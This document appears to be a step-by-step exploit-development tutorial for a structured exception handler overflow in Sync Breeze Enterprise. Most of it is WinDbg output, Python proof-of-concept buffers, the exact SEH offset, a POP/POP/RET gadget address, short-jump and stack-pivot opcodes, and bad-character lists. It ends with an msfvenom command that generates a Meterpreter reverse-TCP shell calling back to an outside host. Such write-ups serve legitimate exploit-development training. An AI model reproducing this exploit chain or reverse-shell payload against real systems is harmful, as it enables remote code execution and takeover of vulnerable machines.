# SEH Overflow - Basic

## Table of Contents.
1. [Crash the application.](#crash)
2. [Analyse the crash.](#analyse)
3. [Inspecting the exception handler chain.](#exchain)
4. [Gaining Control of Exception Hanlder.](#GCEH)
5. [Detecting Bad Characters.](#BadChars)
6. [Finding a P/P/R Instruction.](#PPR)
7. [Gaining control of Instruction Pointer.](#ESP)
8. [Short Jump.](#ShortJump)
9. [Locate the shellcode.](#LocateShellcode)
10. [Reach our shellcode.](#ReachShellcode)
11. [Get a Shell!](#Shell)

### Crash the application.<a href="crash"></a>

```python
...
size = 1000

inputBuffer = b"A" * size
...
```

### Analyse the crash.<a href="analyse"></a>

Insepcting at the time of the crash, i can see that thise time EIP isn't overwritten, but EAX register is. 

The crash occurs when executing the instruction "call dword..." because this address is not mapped in memory, in fact, executing it trigger an access violation.

```bash
0:010> g
(13d4.1280): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=41414141 ebx=0073fa0c ecx=0073ff08 edx=0073f9c4 esi=0073ff08 edi=0073fb10
eip=00852a9d esp=0073f998 ebp=0073feb8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00852a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????
```

At this step, the debugger intercepted a first chance exception.

First chance exception = A notification that an unexpected event occured during the program execution.

We can see too that few registers containt a chunk of our buffer.

```bash
0:009> dds esp L30
0073f998  0073fb10
0073f99c  0073f9ac
0073f9a0  00000000
0073f9a4  0073ff08
0073f9a8  0073fa0c
0073f9ac  00000000
0073f9b0  008666c2 libpal!SCA_NetMessage::Deserialize+0x82
...
0073fa04  000003e8
0073fa08  00000041
0073fa0c  41414141
0073fa10  41414141
0073fa14  41414141
0073fa18  41414141
...
```

Continue the execution flow.

```bash
0:009> g
(13d4.1280): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=77e25b50 esi=00000000 edi=00000000
eip=41414141 esp=0073f440 ebp=0073f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
```

This time we can see that we gain the control of the EIP, this happen because of SEH (<a href="https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms">Structured Exception Handler</a>).

### Inspecting the exception handler chain.<a href="exchain"></a>

Using the command "!exchain", we are able to inspect the exception handler chain at the moment of the crash.

```bash
0:010> g
(13d4.1280): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=41414141 ebx=0073fa0c ecx=0073ff08 edx=0073f9c4 esi=0073ff08 edi=0073fb10
eip=00852a9d esp=0073f998 ebp=0073feb8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00852a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????
0:009> !exchain
0073fe0c: libpal!md5_starts+149fb (008cdf5b)
0073ff44: 41414141
```

By doing so, we are able to see if we can overwrite the exact offset of exception handler.

### Gaining Control of Exception Handler.<a href="GCEH"></a>

As we do not control the stack in our scenario, we can't redirect the execution flow to it using an instruction like "JMP ESP" as we do in a vanilla stack overflow.

Generate a unique string to locate the exact offset of the exception handler.

```bash
┌──(v0lk3n㉿Laptop)-[~/SEH-Overflow-Basic]
└─$ msf-pattern_create -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac...
```

Update your PoC

```python
...
size = 1000

inputBuffer = b"<UniqueString>"
...
```

Run it and inspect the exception handler chain at the time of the crash.

```bash
0:009> g
(1178.1eac): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=63413163 ebx=019dfa0c ecx=019dff08 edx=019df9c4 esi=019dff08 edi=019dfb10
eip=00912a9d esp=019df998 ebp=019dfeb8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00912a9d ff5024          call    dword ptr [eax+24h]  ds:0023:63413187=????????

0:011> !exchain
019dfe0c: libpal!md5_starts+149fb (0098df5b)
019dff44: 33654132
Invalid exception stack at 65413165

```

Search for the exact offset.

```bash
┌──(v0lk3n㉿Laptop)-[~/SEH-Overflow-Basic]
└─$ msf-pattern_offset -q 33654132 -l 1000
[*] Exact match at offset 128
```

Now as for vanilla stack overflow, update the buffer of your PoC to send four B at this exact offset.

```python
...
size = 1000

Buffer = b"A" * 128
seh = b"B" * 4
shellcode = b"C" * (size - len(Buffer) - len(seh))
...
```

Run it, and verify that we got the control of Exception Handler.

```bash
0:009> g
(1b9c.1fe4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=41414141 ebx=01a1fa0c ecx=01a1ff08 edx=01a1f9c4 esi=01a1ff08 edi=01a1fb10
eip=00862a9d esp=01a1f998 ebp=01a1feb8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
libpal!SCA_ConfigObj::Deserialize+0x1d:
00862a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????

0:011> !exchain
01a1fe0c: libpal!md5_starts+149fb (008ddf5b)
01a1ff44: 42424242
Invalid exception stack at 41414141

0:011> g
(1b9c.1fe4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=42424242 edx=77e25b50 esi=00000000 edi=00000000
eip=42424242 esp=01a1f440 ebp=01a1f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
42424242 ??              ???

```

As we can confirm, we successfully overwritted the exception handler with our four B. Continue the execution show that the EIP is overwritten with our four B as expected.

### Detecting Bad Characters.<a href="BadChars"></a>

```python
...
size = 1000

badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
    b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
    b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
    b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
    b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
    b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
    b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
    b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
    b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
    b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
    b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
    b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
    b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
    b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
    b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
    b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
    b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
    b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
...
```

Run the PoC with our bunch of hexadecimal characters. 

After causing the crash, continue the execution flow to reach EIP and locate our bunch of hexadecimal chars.

```bash

0:009> dds esp L8
0184f440  77e25b32 ntdll!ExecuteHandler2+0x26
0184f444  0184f540
0184f448  0184ff44 #<= Exception Handler
0184f44c  0184f55c
0184f450  0184f4cc
0184f454  0184fe0c
0184f458  77e25b50 ntdll!ExecuteHandler2+0x44
0184f45c  0184ff44

0:009> !exchain
0184f454: ntdll!ExecuteHandler2+44 (77e25b50)
0184fe0c: libpal!md5_starts+149fb (0090df5b)
0184ff44: 42424242
Invalid exception stack at 41414141

```

We can see that the address point to the exception handler, where we overwritten with our four B, read the memory of it.

```bash
0:009> db 0184ff44
0184ff44  41 41 41 41 42 42 42 42-01 00 00 00 ec 07 8c 00  AAAABBBB........
0184ff54  10 3e 8c 00 58 38 e1 00-72 40 8c 00 60 84 e1 00  .>..X8..r@..`...
0184ff64  58 38 e1 00 24 3e 8c 00-60 84 e1 00 10 3e 8c 00  X8..$>..`....>..
0184ff74  39 cf 42 76 58 38 e1 00-20 cf 42 76 dc ff 84 01  9.BvX8.. .Bv....
0184ff84  a5 26 da 77 58 38 e1 00-34 50 34 32 00 00 00 00  .&.wX8..4P42....
0184ff94  00 00 00 00 58 38 e1 00-00 00 00 00 00 00 00 00  ....X8..........
0184ffa4  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0184ffb4  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
```

We can see that we locate our hexadecimal characters, and find that after the char "0x01" our buffer is truncated, meaning that "0x02" is a bad character.

Now that our characters are located, repeat the step above until found all bad characters.

### Finding a P/P/R Instructions.<a href="PPR"></a>

First, we need to find a module without protection that didnt containt any bad characters.

```bash
0:010> !load narly

0:010> !nmod
00400000 00463000 syncbrs              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe
00540000 00614000 libpal               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
00820000 008d5000 libsync              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libsync.dll
10000000 10226000 libspp               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll

```

The "libspp.dll" seem to be perfect.

Now, we need to search a P/P/R instruction sequence inside the module. To do it we need to retrieve the start and end memory address.

```bash
0:010> lm m libspp
Browse full module list
start    end        module name
10000000 10226000   libspp     (deferred)             
```

Now we need to get all the possible opcodes for the POP instructions for each x86 register, excluding the stack pointer (ESP). And the opcode for the RET instruction.

```bash
┌──(v0lk3n㉿Laptop)-[/SEH-Overflow-Basic]
└─$ msf-nasm_shell
nasm > POP EAX
00000000  58                pop eax
nasm > POP EBX
00000000  5B                pop ebx
nasm > POP ECX
00000000  59                pop ecx
nasm > POP EBP
00000000  5D                pop ebp
nasm > POP EDX
00000000  5A                pop edx
nasm > POP ESI
00000000  5E                pop esi
nasm > POP EDI
00000000  5F                pop edi
nasm > ret
00000000  C3                ret
```

Create a little WinDbg script that will create every possible POP R32 combination and search for it inside the memory range of the module, and execute it.

```wds
.block  
{  
	.for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)  
	{  
		.for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)  
		{  
			s-[1]b 10000000 10226000 $t0 $t1 c3  
		}  
	}  
}
```

```bash
0:010> $><C:\Installers\seh_overflow\find_ppr.wds
0x1015a2f0 #<= The one i took.
0x100087dd
0x10008808
0x1000881a
0x10008829
...
```

As expected, the script return a list of all memory addresses from the module. Select and address without bad characters in it, and verify that it point to a P/P/R instruction sequence.

```bash
0:010> u 1015a2f0 L3
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax
1015a2f1 5b              pop     ebx
1015a2f2 c3              ret
```

The address points to valid sequence of instructions, and doesn't contain any bad chars.

### Gaining control of Instruction Pointer.<a href="ESP"></a>

Now we can update the PoC and try to overwrite the instruction pointer with the P/P/R instruction.

```python
...
size = 1000

aBuffer = b"A" * 128
bBuffer = pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
cBuffer = b"C" * 868
inputBuffer = aBuffer + bBuffer + cBuffer
...
```

Run the PoC and inspect the Exception Handler chain.

```bash
0:009> !exchain
0081fe0c: libpal!md5_starts+149fb (005cdf5b)
0081ff44: libspp!pcre_exec+16460 (1015a2f0) #<= P/P/R address
Invalid exception stack at 41414141

0:009> u 1015a2f0 L3
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax
1015a2f1 5b              pop     ebx
1015a2f2 c3              ret

```

As we can see, we successfully overwritted the Exception Handler with our P/P/R instructions sequence.

Set a breakpoint to the P/P/R and continue the execution flow. Once we reach our breakpoint, single step through the POP instructions and inspect the address we will be returning into (RET).

```bash
0:009> bp 0x1015a2f0

0:009> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=1015a2f0 esp=0081f440 ebp=0081f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax

0:009> t
eax=77705b32 ebx=00000000 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=1015a2f1 esp=0081f444 ebp=0081f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16461:
1015a2f1 5b              pop     ebx

0:009> t
eax=77705b32 ebx=0081f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=1015a2f2 esp=0081f448 ebp=0081f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16462:
1015a2f2 c3              ret

0:009> dd poi(esp) L10
0081ff44  41414141 1015a2f0 43434343 43434343
0081ff54  43434343 43434343 43434343 43434343
0081ff64  43434343 43434343 43434343 43434343
0081ff74  43434343 43434343 43434343 43434343

0:009> t
eax=77705b32 ebx=0081f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=0081ff44 esp=0081f44c ebp=0081f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0081ff44 41              inc     ecx

```

We can see that after executing the RET instruction, we returned into the stack within our controlled buffer right before our Exception Handler address.

### Short Jump.<a href="ShortJump"></a>

Now, inspect the resulting assembly instructions inside WinDbg.

```bash
0:009> u eip L10
0081ff44 41              inc     ecx
0081ff45 41              inc     ecx
0081ff46 41              inc     ecx
0081ff47 41              inc     ecx
0081ff48 f0a215104343    lock mov byte ptr ds:[43431015h],al
0081ff4e 43              inc     ebx
0081ff4f 43              inc     ebx
0081ff50 43              inc     ebx
0081ff51 43              inc     ebx
0081ff52 43              inc     ebx
0081ff53 43              inc     ebx
0081ff54 43              inc     ebx
0081ff55 43              inc     ebx
0081ff56 43              inc     ebx
0081ff57 43              inc     ebx
0081ff58 43              inc     ebx
```

We can see that the bytes composing the P/P/R address are translated to a "lock mov byte" instruction.

The instruction uses part of our buffer as a destination address to write the content of the AL register.

As this memory address isn't mapped, once executed, it will trigger another access violation and break our exploit.

To overcome this we can use Short Jump to redirect the execution flow directly after this instruction.

After had single step through the P/P/R instructions, let's assemble the short jump and get it's opcodes.

```bash
0:009> dds eip L4
0081ff44  41414141
0081ff48  1015a2f0 libspp!pcre_exec+0x16460 # We should execute this.
0081ff4c  43434343							# We want to execute this.
0081ff50  43434343

0:009> a
0081ff44 jmp 0x0081ff4c
jmp 0x0081ff4c
0081ff46 

0:009> u eip L5
0081ff44 eb06            jmp     0081ff4c # Our short jump
0081ff46 41              inc     ecx
0081ff47 41              inc     ecx
0081ff48 f0a215104343    lock mov byte ptr ds:[43431015h],al
0081ff4e 43              inc     ebx

0:009> dds eip L3
0081ff44  414106eb # Our short jump
0081ff48  1015a2f0 libspp!pcre_exec+0x16460
0081ff4c  43434343

```

Great, now we can update our PoC to include it.

```python
size = 1000

inputBuffer = b"\x41" * 124
inputBuffer += pack("<L", (0x06eb9090)) # (Short Jump Address)
inputBuffer += pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
inputBuffer += b"\x41" * (size - len(inputBuffer))
```

Run the PoC, set a breakpoint to the P/P/R instruction, and let the debugger continue until it hit our breakpoint.

Then singe step through the P/P/R instruction sand reach our short jump.

```bash
0:011> t
eax=77705b32 ebx=01a1f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=01a1ff45 esp=01a1f44c ebp=01a1f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
01a1ff45 90              nop
0:011> t
eax=77705b32 ebx=01a1f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=01a1ff46 esp=01a1f44c ebp=01a1f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
01a1ff46 eb06            jmp     01a1ff4e
0:011> dd 01a1ff4e - 0x06
01a1ff48  1015a2f0 41414141 41414141 41414141
01a1ff58  41414141 41414141 41414141 41414141
01a1ff68  41414141 41414141 41414141 41414141
01a1ff78  41414141 41414141 41414141 41414141
01a1ff88  41414141 41414141 41414141 41414141
01a1ff98  41414141 41414141 41414141 41414141
01a1ffa8  41414141 41414141 41414141 41414141
01a1ffb8  41414141 41414141 41414141 41414141
```

As we can see, if we execute the short jump, we will indeed land in our buffer right after the SEH.

### Locate the Shellcode.<a href="LocateShellcode"></a>

Now inspecting the memory pointed to by the instruction pointer, we see that we are very close to reaching the beginning of our stack.

```bash
0:011> dd eip L30
01a1ff46  a2f006eb 41411015 41414141 41414141
01a1ff56  41414141 41414141 41414141 41414141
01a1ff66  41414141 41414141 41414141 41414141
01a1ff76  41414141 41414141 41414141 41414141
01a1ff86  41414141 41414141 41414141 41414141
01a1ff96  41414141 41414141 41414141 41414141
01a1ffa6  41414141 41414141 41414141 41414141
01a1ffb6  41414141 41414141 41414141 41414141
01a1ffc6  41414141 ff004141 84b001a1 966b776f
01a1ffd6  000085cf ffec0000 267901a1 ffff7768
01a1ffe6  5ca3ffff 00007770 00000000 3e100000
01a1fff6  3b50008b 000000de ???????? ????????

0:011> !teb
TEB at 00380000
    ExceptionList:        01a1f454
    StackBase:            01a20000
    StackLimit:           01a1e000
...
```

Maybe we can fit a small shellcode, but it's better to expand the buffer size to put a reverse shell shellcode.

Update our PoC adding a shellcode variable to expand our buffer size and some NOPs instruction after our POP POP RET instructions.

```python
...
size = 1000

shellcode = b"\x43" * 400

inputBuffer = b"\x41" * 124
inputBuffer += pack("<L", (0x06eb9090)) # (NSEH)
inputBuffer += pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
inputBuffer += b"\x90" * (size - len(inputBuffer) - len(shellcode))
inputBuffer += shellcode
...
```

Run the PoC, set a breakpoint to the P/P/R, continue the execution flow, single step since reaching the next instruction of our short jump. Then see the TEB structure.

```bash
0:009> bp 0x1015a2f0
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll

0:009> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=1015a2f0 esp=007bf440 ebp=007bf460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax

0:009> t
eax=77705b32 ebx=00000000 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=1015a2f1 esp=007bf444 ebp=007bf460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16461:
1015a2f1 5b              pop     ebx

...

0:009> t
eax=77705b32 ebx=007bf540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=007bff46 esp=007bf44c ebp=007bf460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
007bff46 eb06            jmp     007bff4e

0:009> t
eax=77705b32 ebx=007bf540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=007bff4e esp=007bf44c ebp=007bf460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
007bff4e 90              nop

0:009> !teb
TEB at 0036d000
    ExceptionList:        007bf454
    StackBase:            007c0000
    StackLimit:           007be000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 0036d000
    EnvironmentPointer:   00000000
    ClientId:             00001d94 . 00001620
    RpcHandle:            00000000
    Tls Storage:          00523248
    PEB Address:          0035f000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0

```

Now that we get the Stack base and limit, we can search for our NOPs instruction followed by our C buffer in it.

Once located, calculate the size of our buffer.

```bash
0:009> s -b 007be000 007c0000 90 90 90 90 43 43 43 43 43 43
007bfc60  90 90 90 90 43 43 43 43-43 43 43 43 43 43 43 43  ....CCCCCCCCCCCC
```

Verify that our DWORDs buffer isn't truncated.

```bash
0:009> dd 007bfc60
007bfc60  90909090 43434343 43434343 43434343
007bfc70  43434343 43434343 43434343 43434343
007bfc80  43434343 43434343 43434343 43434343
007bfc90  43434343 43434343 43434343 43434343
007bfca0  43434343 43434343 43434343 43434343
007bfcb0  43434343 43434343 43434343 43434343
007bfcc0  43434343 43434343 43434343 43434343
007bfcd0  43434343 43434343 43434343 43434343

0:009> dd 007bfc64 L65
007bfc64  43434343 43434343 43434343 43434343
007bfc74  43434343 43434343 43434343 43434343
007bfc84  43434343 43434343 43434343 43434343
007bfc94  43434343 43434343 43434343 43434343
007bfca4  43434343 43434343 43434343 43434343
007bfcb4  43434343 43434343 43434343 43434343
007bfcc4  43434343 43434343 43434343 43434343
007bfcd4  43434343 43434343 43434343 43434343
007bfce4  43434343 43434343 43434343 43434343
007bfcf4  43434343 43434343 43434343 43434343
007bfd04  43434343 43434343 43434343 43434343
007bfd14  43434343 43434343 43434343 43434343
007bfd24  43434343 43434343 43434343 43434343
007bfd34  43434343 43434343 43434343 43434343
007bfd44  43434343 43434343 43434343 43434343
007bfd54  43434343 43434343 43434343 43434343
007bfd64  43434343 43434343 43434343 43434343
007bfd74  43434343 43434343 43434343 43434343
007bfd84  43434343 43434343 43434343 43434343
007bfd94  43434343 43434343 43434343 43434343
007bfda4  43434343 43434343 43434343 43434343
007bfdb4  43434343 43434343 43434343 43434343
007bfdc4  43434343 43434343 43434343 43434343
007bfdd4  43434343 43434343 43434343 43434343
007bfde4  43434343 43434343 43434343 43434343
007bfdf4  fffffffe
```

### Reach our Shellcode.<a href="ReachShellcode"></a>

Now we need to find the offset from our current stack pointer to the beggining of our shellcode.

```bash
0:009> s -b 007be000 007c0000 90 90 90 90 43 43 43 43 43 43
007bfc60  90 90 90 90 43 43 43 43-43 43 43 43 43 43 43 43  ....CCCCCCCCCCCC

0:009> dd 007bfc60
007bfc60  90909090 43434343 43434343 43434343
007bfc70  43434343 43434343 43434343 43434343
007bfc80  43434343 43434343 43434343 43434343
007bfc90  43434343 43434343 43434343 43434343
007bfca0  43434343 43434343 43434343 43434343
007bfcb0  43434343 43434343 43434343 43434343
007bfcc0  43434343 43434343 43434343 43434343
007bfcd0  43434343 43434343 43434343 43434343

0:009> ? 007bfc64 - @esp
Evaluate expression: 2072 = 00000818

```

Using the space available after our short jump, we will assemble instructions to increase the stack pointer by 830 bytes followed by a "JMP ESP" to jump to our shellcode next.

Generate the opcodes and verify that it didn't containt any bad characters.

```bash
┌──(v0lk3n㉿Omen-Laptop)-[~/SEH-Overflow-Basic]
└─$ msf-nasm_shell
nasm > add sp, 0x830
00000000  6681C43008        add sp,0x830
nasm > jmp esp
00000000  FFE4              jmp esp
```

Now update the PoC to add those two instructions.

```python
...
size = 1000

shellcode = b"\x90" * 8
shellcode += b"\x43" * (400 - len(shellcode))

inputBuffer = b"\x41" * 124
inputBuffer += pack("<L", (0x06eb9090)) # (NSEH)
inputBuffer += pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
inputBuffer += b"\x90" * 2
inputBuffer += b"\x66\x81\xc4\x30\x08"  # add sp, 0x830
inputBuffer += b"\xff\xe4"              # jmp esp
inputBuffer += b"\x90" * (size - len(inputBuffer) - len(shellcode))
inputBuffer += shellcode
...
```

Execute the PoC, set a break point to the P/P/R and continue the execution. Single step through each isntruction to confrim that it's correct.

```bash
0:009> bp 1015a2f0
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
0:009> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=1015a2f0 esp=0182f440 ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax

0:009> t
eax=77705b32 ebx=00000000 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=1015a2f1 esp=0182f444 ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16461:
1015a2f1 5b              pop     ebx

0:009> t
eax=77705b32 ebx=0182f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=1015a2f2 esp=0182f448 ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16462:
1015a2f2 c3              ret

0:009> t
eax=77705b32 ebx=0182f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=0182ff44 esp=0182f44c ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0182ff44 90              nop

0:009> t
eax=77705b32 ebx=0182f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=0182ff45 esp=0182f44c ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0182ff45 90              nop

0:009> t
eax=77705b32 ebx=0182f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=0182ff46 esp=0182f44c ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0182ff46 eb06            jmp     0182ff4e

0:009> t
eax=77705b32 ebx=0182f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=0182ff4e esp=0182f44c ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0182ff4e 6681c43008      add     sp,830h

0:009> t
eax=77705b32 ebx=0182f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
eip=0182ff53 esp=0182fc7c ebp=0182f460 iopl=0         nv up ei ng nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
0182ff53 ffe4            jmp     esp {0182fc7c}

0:009> dd @esp L4
0182fc7c  43434343 43434343 43434343 43434343

```

We can see all our intruction, but it appear that esp didnt point to the beginning of our shellcode buffer as we dont see our NOPS instruction.

To overcome this simply expand the number of NOPs instruction before our shellcode.

```python
...
size = 1000

shellcode = b"\x90" * 20
shellcode += b"\x43" * (400 - len(shellcode))
...
```

```bash
0:010> dd @esp L4  
01cafc74 90909090 90909090 43434343 43434343  
  
0:010> t  
eax=77383b02 ebx=01caf540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000  
eip=01cafc74 esp=01cafc74 ebp=01caf458 iopl=0 nv up ei ng nz na pe nc  
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000286  01cafc74 90 nop
```

### Get a Shell!<a href="Shell"></a>

Generate the shellcode and update the PoC.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
```

Start a listener and run the PoC to get a shell!
